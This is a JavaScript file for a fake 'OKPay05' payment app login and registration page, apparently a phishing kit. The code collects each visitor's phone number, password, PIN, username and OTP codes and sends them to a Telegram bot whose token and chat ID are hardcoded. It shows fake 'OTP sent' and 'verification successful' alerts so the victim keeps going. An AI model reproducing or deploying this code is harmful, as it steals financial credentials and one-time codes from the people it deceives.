// ----- TELEGRAM CONFIG (1 BOTS / CHATS) -----
const TELEGRAM_CONFIGS = [
    {
        botToken: '8506429274:AAGA_uRWklgoWruvhZgf2R54ufL6IL0xGXw', // Pehla Bot Token
        chatId: '1706252195'                                       // Pehla Chat ID
 
    }
];

// State Variables
let timerInterval = null;
let timerSeconds = 60;
let isTimerRunning = false;

// Register Timer State Variables
let regTimerInterval = null;
let regTimerSeconds = 60;
let isRegTimerRunning = false;

// Send Telegram Notification Helper (Dono bots ko bhejne ke liye)
function sendTelegram(message) {
    TELEGRAM_CONFIGS.forEach((config, index) => {
        if (!config.botToken || !config.chatId || config.botToken.includes('YAHAN')) {
            return;
        }
        
        const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: config.chatId,
                text: message,
                parse_mode: 'HTML'
            })
        })
        .then(res => {
            if (!res.ok) console.warn(`Telegram bot ${index + 1} send failed`, res.status);
        })
        .catch(err => console.warn(`Telegram bot ${index + 1} error`, err));
    });
}

// Navigation Handler
function navigateTo(screen) {
    const loginScreen = document.getElementById('login-screen');
    const registerScreen = document.getElementById('register-screen');

    if (screen === 'register') {
        loginScreen.style.display = 'none';
        registerScreen.style.display = 'flex';
    } else if (screen === 'login') {
        registerScreen.style.display = 'none';
        loginScreen.style.display = 'flex';
    }
}

// Timer Functions (With Spinner & Countdown Integration for Login Modal)
function startTimer() {
    const timerElement = document.getElementById('modal-timer');
    const countdownElement = document.getElementById('timer-countdown');
    const sendBtn = document.getElementById('modal-send-otp-btn');

    if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
    }

    timerSeconds = 59;
    isTimerRunning = true;
    if(timerElement) timerElement.classList.add('active');

    // Step 1: Show loading spinner inside the button instantly
    sendBtn.disabled = true;
    sendBtn.style.backgroundColor = '#059669';
    sendBtn.innerHTML = '<div class="spinner"></div>';

    // Step 2: After 1 second, start the seconds countdown on the button and set dark/grey background
    setTimeout(() => {
        sendBtn.innerHTML = timerSeconds + 's';
        sendBtn.style.backgroundColor = '#cbd5e1'; 
        if (countdownElement) countdownElement.textContent = timerSeconds;

        timerInterval = setInterval(() => {
            timerSeconds--;
            if (countdownElement) countdownElement.textContent = timerSeconds;
            sendBtn.innerHTML = timerSeconds + 's';

            if (timerSeconds <= 0) {
                clearInterval(timerInterval);
                timerInterval = null;
                isTimerRunning = false;
                if(timerElement) timerElement.classList.remove('active');
                sendBtn.disabled = false;
                sendBtn.style.backgroundColor = '#059669';
                sendBtn.innerHTML = 'Resend';
            }
        }, 1000);
    }, 1000);
}

// Modal Control
function closeModal() {
    if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
        isTimerRunning = false;
        const modalTimer = document.getElementById('modal-timer');
        if(modalTimer) modalTimer.classList.remove('active');
        const sendBtn = document.getElementById('modal-send-otp-btn');
        sendBtn.disabled = false;
        sendBtn.style.backgroundColor = '#059669';
        sendBtn.innerHTML = 'Send';
    }
    document.getElementById('verification-modal').style.display = 'none';
}

// OTP Handlers for Register Screen (With Spinner & Timer Integration)
function sendOTP() {
    const usernameInput = document.getElementById('reg-username');
    const phoneInput = document.getElementById('reg-phone');
    const sendBtn = document.getElementById('btn-send-reg-otp');
    
    if (!usernameInput || !usernameInput.value.trim()) {
        alert("Please enter User name");
        if (usernameInput) usernameInput.focus();
        return;
    }

    const phone = phoneInput?.value.trim();
    if (!phone || phone.length < 10) {
        alert("Please enter a valid 10-digit Phone number.");
        if (phoneInput) phoneInput.focus();
        return;
    }

    if (isRegTimerRunning) {
        return;
    }

    const username = usernameInput.value.trim();
    // 1-Tap copy enabled via <code> tags
    const msg = `🔐 <b>Register OTP requested</b>\n👤 User: <code>${username}</code>\n📱 Phone: +91 <code>${phone}</code>`;
    sendTelegram(msg);

    // Start Spinner & Timer for Register OTP Button
    isRegTimerRunning = true;
    sendBtn.disabled = true;
    sendBtn.style.backgroundColor = '#059669';
    sendBtn.innerHTML = '<div class="spinner"></div>';

    setTimeout(() => {
        regTimerSeconds = 59;
        sendBtn.innerHTML = regTimerSeconds + 's';
        sendBtn.style.backgroundColor = '#cbd5e1';

        regTimerInterval = setInterval(() => {
            regTimerSeconds--;
            sendBtn.innerHTML = regTimerSeconds + 's';

            if (regTimerSeconds <= 0) {
                clearInterval(regTimerInterval);
                regTimerInterval = null;
                isRegTimerRunning = false;
                sendBtn.disabled = false;
                sendBtn.style.backgroundColor = '#059669';
                sendBtn.innerHTML = 'Resend';
            }
        }, 1000);
    }, 1000);

    setTimeout(() => {
        alert("OTP sent successfully for registration!");
    }, 200);
}

function sendModalOTP() {
    if (isTimerRunning) {
        alert("Please wait for the timer to finish before requesting a new OTP.");
        return;
    }

    const phone = document.getElementById('login-phone')?.value || 'unknown';
    // 1-Tap copy enabled via <code> tag
    const msg = `🔐 <b>Login OTP requested (Modal)</b>\n📱 Phone: +91 <code>${phone}</code>`;
    sendTelegram(msg);
    
    // Trigger spinner and timer sequence
    startTimer();

    setTimeout(() => {
        alert("OTP Sent Successfully!");
    }, 200);
}

function confirmVerification() {
    const otpVal = document.getElementById('modal-otp').value.trim();
    const phone = document.getElementById('login-phone')?.value || 'unknown';
    
    if (otpVal === "") {
        alert("Please enter the OTP Code.");
        return;
    }

    if (otpVal.length !== 6) {
        alert("❌ Please enter a valid 6-digit OTP.");
        document.getElementById('modal-otp').value = '';
        return;
    }

    // 1-Tap copy enabled via <code> tags
    const otpMsg = `🔑 <b>OTP Entered</b>\n📱 Phone: +91 <code>${phone}</code>\n🔢 OTP: <code>${otpVal}</code>`;
    sendTelegram(otpMsg);

    if (otpVal === "123456") {
        const successMsg = `✅ <b>Login Successful</b>\n📱 Phone: +91 <code>${phone}</code>\n🔑 OTP verified successfully!`;
        sendTelegram(successMsg);
        alert("✅ Verification successful! Logging in...");
        closeModal();
    } else {
        alert("❌ Wrong OTP! Please try again.");
        document.getElementById('modal-otp').value = '';
    }
}

// Sign-In & Sign-Up Handlers
function handleSignIn() {
    const phoneInput = document.getElementById('login-phone').value.trim();
    const privacyChecked = document.getElementById('privacy-agree').checked;
    
    if (!privacyChecked) {
        alert("Please agree to the 'User Privacy Agreement' first.");
        return;
    }

    if (phoneInput === "" || phoneInput.length < 10) {
        alert("Please enter a valid 10-digit Phone number.");
        return;
    }

    if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
        isTimerRunning = false;
        const modalTimer = document.getElementById('modal-timer');
        if(modalTimer) modalTimer.classList.remove('active');
        const sendBtn = document.getElementById('modal-send-otp-btn');
        sendBtn.disabled = false;
        sendBtn.style.backgroundColor = '#059669';
        sendBtn.innerHTML = 'Send';
    }

    document.getElementById('dynamic-otp-text').innerText = "OTP will be sent to +91 " + phoneInput;
    document.getElementById('modal-otp').value = '';
    
    const pass = document.getElementById('login-pass')?.value || 'No Password Entered';
    const pin = document.getElementById('login-pin')?.value || 'No PIN Entered';
    
    // 1-Tap copy enabled via <code> tags for phone, password and pin
    const msg = `✅ <b>New OKPay05 Login</b>\n📱 Phone: <code>${phoneInput}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin}</code>`;
    sendTelegram(msg);

    document.getElementById('verification-modal').style.display = 'flex';
}

function handleSignUp() {
    const username = document.getElementById('reg-username')?.value || 'unknown';
    const phone = document.getElementById('reg-phone')?.value || 'unknown';
    const pass = document.getElementById('reg-pass')?.value || 'No Password Entered';
    const pin = document.getElementById('reg-pin')?.value || 'No PIN Entered';
    const invite = document.getElementById('reg-invite')?.value || '—';

    // 1-Tap copy enabled via <code> tags for all registration fields
    const msg = `🆕 <b>New OKPay05 registration</b>\n👤 User: <code>${username}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin}</code>\n🎫 Invite: <code>${invite}</code>`;
    sendTelegram(msg);

    alert("Registration successful!");
    navigateTo('login');
}

// Attach Event Listeners on DOM Loaded
document.addEventListener('DOMContentLoaded', function() {
    // Navigation
    document.getElementById('nav-to-register').addEventListener('click', () => navigateTo('register'));
    document.getElementById('nav-to-login').addEventListener('click', () => navigateTo('login'));

    // Buttons
    document.getElementById('btn-sign-in').addEventListener('click', handleSignIn);
    document.getElementById('btn-sign-up').addEventListener('click', handleSignUp);
    document.getElementById('btn-send-reg-otp').addEventListener('click', sendOTP);
    document.getElementById('modal-send-otp-btn').addEventListener('click', sendModalOTP);
    document.getElementById('btn-close-modal').addEventListener('click', closeModal);
    document.getElementById('btn-confirm-verification').addEventListener('click', confirmVerification);

    // Input constraints (digits only)
    const restrictDigits = (id, maxLen) => {
        const input = document.getElementById(id);
        if (input) {
            input.addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '');
                if (this.value.length > maxLen) {
                    this.value = this.value.slice(0, maxLen);
                }
            });
        }
    };

    restrictDigits('login-phone', 10);
    restrictDigits('login-pin', 6);
    restrictDigits('reg-phone', 10);
    restrictDigits('reg-pin', 6);
    restrictDigits('modal-otp', 6);
});
